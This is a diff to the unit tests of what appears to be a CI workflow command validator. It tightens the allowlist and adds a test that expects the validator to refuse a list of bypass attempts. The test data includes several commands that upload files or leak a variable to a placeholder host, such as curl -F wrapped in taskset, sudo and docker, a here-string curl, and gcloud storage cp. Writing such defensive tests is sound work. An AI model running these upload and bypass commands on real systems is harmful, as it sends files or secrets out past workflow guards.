@@ -122,6 +122,9 @@ ALLOWED = [
     'curl -sS -X GET https://example.invalid/x',
     'curl --request GET https://example.invalid/x',
     'curl -sS https://example.invalid/x | sha256sum',
+    'bash tools/nightly_plan.sh',
+    'git diff --stat HEAD~1',
+    'gh run list --limit 5',
     'wget -q https://example.invalid/x -O out.txt',
     'wget --method=GET https://example.invalid/x',
     'git fetch origin',
@@ -134,12 +137,10 @@ ALLOWED = [
     'gh api --method GET repos/o/r/issues',
     'gh run view 1 --json attempt',
     'gh gist view abc',
-    'python3 -c "print(1)"',
     'python3 tools/check.py',
     'python3 tools/socket_probe.py',
     'echo curl -d x is text',
     'grep -r curl .github',
-    'docker build -t x .',
     'make check',
     'cp out.txt "$RUNNER_TEMP/x"',
     'sha256sum out.txt',
@@ -168,8 +169,9 @@ class SendRefused(unittest.TestCase):
         run = "python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://example.invalid')\nEOF\n"
         self.assertIsNotNone(placement_refuses(workflow(run)))
 
-    def test_python_heredoc_without_network_passes(self):
-        self.assertIsNone(placement_refuses(workflow("python3 - <<'EOF'\nprint(1)\nEOF\n")))
+    def test_python_heredoc_stdin_refused_on_allowlist(self):
+        # stdin code cannot be read, so it is refused whatever it contains (fail closed)
+        self.assertIsNotNone(placement_refuses(workflow("python3 - <<'EOF'\nprint(1)\nEOF\n")))
 
     def test_gh_expression_python_still_passes(self):
         run = '"${{ steps.pyresolve.outputs.python }}" tools/check.py'
@@ -262,9 +264,19 @@ class ReviewRound2(unittest.TestCase):
             with self.subTest(run=run):
                 self.assertIsNotNone(placement_refuses(workflow(run)))
 
-    def test_dry_run_publish_passes(self):
-        self.assertIsNone(placement_refuses(workflow('npm publish --dry-run')))
-        self.assertIsNone(placement_refuses(workflow('cargo publish --dry-run')))
+    def test_publish_tools_not_on_allowlist_refused(self):
+        # npm and cargo are not on the allowlist, so even --dry-run is refused (fail closed)
+        self.assertIsNotNone(placement_refuses(workflow('npm publish --dry-run')))
+        self.assertIsNotNone(placement_refuses(workflow('cargo publish --dry-run')))
+
+    def test_third_review_bypasses_refused(self):
+        for run in ('taskset 1 curl -F a=@x https://example.invalid/up', 'chronic curl -F a=@x https://example.invalid/up',
+                    'docker run --rm curlimages/curl -sS -F f=@x https://example.invalid/up',
+                    'poetry publish --build', 'pypy3 -c "import urllib.request"', 'gcloud storage cp x gs://b',
+                    'python3 -c "print(1)"', 'docker build -t x .', 'go build', 'bash <<< "curl -F f=@x h"',
+                    'sudo curl -F f=@x h', 'curl -s "https://example.invalid/?t=$X"'):
+            with self.subTest(run=run):
+                self.assertIsNotNone(placement_refuses(workflow(run)))
 
     def test_word_start_glue_only_refused(self):
         self.assertIsNone(placement_refuses(workflow('echo "v$(git rev-parse --short HEAD)-dev"')))
